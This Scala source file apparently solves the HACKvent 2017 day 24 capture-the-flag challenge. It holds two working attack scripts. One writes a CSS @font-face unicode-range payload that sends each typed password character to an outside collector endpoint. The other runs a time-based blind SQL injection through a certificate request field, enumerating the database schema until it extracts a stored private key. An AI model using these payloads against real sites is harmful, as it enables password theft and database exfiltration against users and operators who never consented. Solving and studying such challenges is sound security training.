package hackvent2017

import java.net.URLEncoder
import java.nio.file.{Files, Paths}

import scala.collection.mutable.ListBuffer
import scala.sys.process._

object Day24 {

  // step 1: @font-face unicode-range exploit (@see http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html)
  // password: Christmas2017 => login => http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78
  def pwnCSS(): Unit = {
    val cssOriginal = Paths.get("hackvent2017/challenges/day24/files/styles-original.css")
    val cssPwned = Paths.get("hackvent2017/challenges/day24/files/styles-pwned.css")
    val endpoint = "https://hookb.in/E5V2ANXB"

    val writer = Files.newBufferedWriter(cssPwned)
    try {
      writer.append(ascii(Files.readAllBytes(cssOriginal)))
      for (ch <- '!' to '~') {
        writer.append(s"""
          |@font-face { /* '$ch' */
          |    font-family: pwn;
          |    src: url("$endpoint?char=${URLEncoder.encode(ch.toString, "UTF-8")}");
          |    unicode-range: U+${hex(ch.toInt, 4).toUpperCase};
          |}
          |""".stripMargin)
      }
      writer.append(s"""
        |#password {
        |    font-family: pwn;
        |}
        |""".stripMargin)
    } finally {
      writer.close()
    }
  }

  // step 2: SQLi on CSR `state` field (MySQL server)
  // SELECT private_key FROM hv24_2.keystorage LIMIT 1 => http://challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
  private def pwnCSR(): Unit = {
    val idChars = ('a' to 'z') ++ ('0' to '9') :+ '$' :+ '_' // case insensitive
    val valueChars = ('a' to 'z') ++ ('A' to 'Z') ++ ('0' to '9') :+ '-' :+ '_' :+ ':' :+ '/' :+ '?' :+ '=' :+ '.' // case sensitive
    val sleep = 3

    /* -- database names extractor -- */

    def databaseNameStmtBuilder()(c: Char, pos: Int, offset: Int): String =
      s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d";

    def extractDatabaseNames(): Seq[String] = extractValues(databaseNameStmtBuilder(), idChars)
    def extractDatabaseName(offset: Int): Option[String] = extractValue(databaseNameStmtBuilder(), idChars, offset)

    /* -- table names extractor -- */

    def tableNamesStmtBuilder(db: String)(c: Char, pos: Int, offset: Int): String =
      s"SELECT IF(substr(table_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.tables WHERE table_schema='$db'LIMIT $offset,1"

    def extractTableNames(db: String): Seq[String] = extractValues(tableNamesStmtBuilder(db), idChars)
    def extractTableName(db: String, offset: Int): Option[String] = extractValue(tableNamesStmtBuilder(db), idChars, offset)

    /* -- column names extractor -- */

    // query was too long to fit into CSR state field so the database name had to be removed from the where clause
    def columnNameStmtBuilder(db: String, table: String)(c: Char, pos: Int, offset: Int): String =
      s"SELECT IF(substr(column_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.columns WHERE table_name='$table'LIMIT $offset,1"

    def extractColumnNames(db: String, table: String): Seq[String] = extractValues(columnNameStmtBuilder(db, table), idChars)
    def extractColumnName(db: String, table: String, offset: Int): Option[String] = extractValue(columnNameStmtBuilder(db, table), idChars, offset)

    /* -- column values extractor -- */

    def columnValueStmtBuilder(db: String, table: String, column: String)(c: Char, pos: Int, offset: Int): String =
      s"SELECT IF(BINARY substr($column,$pos,1)='$c',sleep($sleep),0)FROM $db.$table LIMIT $offset,1"

    def extractColumnValues(db: String, table: String, column: String): Seq[String] = extractValues(columnValueStmtBuilder(db, table, column), valueChars)
    def extractColumnValue(db: String, table: String, column: String, offset: Int): Option[String] = extractValue(columnValueStmtBuilder(db, table, column), valueChars, offset)

    /* -- common extractor -- */

    def extractValues(builder: (Char, Int, Int) => String, alphabet: Seq[Char]): Seq[String] = {
      val values = ListBuffer[String]()

      var offset = 0
      var found = false
      do {
        val value = extractValue(builder, alphabet, offset)
        if (value.isDefined) values += value.get
        found = value.isDefined
        offset += 1
      } while (found)

      values.toList
    }

    def extractValue(builder: (Char, Int, Int) => String, alphabet: Seq[Char], offset: Int): Option[String] = {
      val value = new StringBuilder()

      var end = false
      while (!end) {
        var found = false
        for (c <- alphabet) {
          if (!found) {
            if (checkSQL(builder(c, value.length+1, offset), sleep)) {
              value.append(c)
              found = true
              print(c)
            }
          }
        }
        end = !found
      }
      if (value.nonEmpty) println(s"\rfound: $value")

      if (value.nonEmpty) Some(value.toString) else None
    }

    def checkSQL(statement: String, sleep: Int) = time(() => generateCert(s"'OR($statement)OR'")) >= sleep

    def generateCert(state: String) = {
      val retcode = s"hackvent2017/challenges/day24/files/generate-cert.sh $state".!
      if (retcode != 0) throw new RuntimeException(s"Unexpected result code: $retcode")
    }

    val db = "hv24_2" // <-- extractDatabaseNames(): List(hv24_2, information_schema, mysql, performance_schema)
    val table = "keystorage" // <-- extractTableNames(db): List(certificates, keystorage)
    val column = "private_key" // <-- extractColumnNames(db, table): List(private_key)
    val value = "challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw" // <-- extractColumnValue(db, table, column, 0)
  }

}
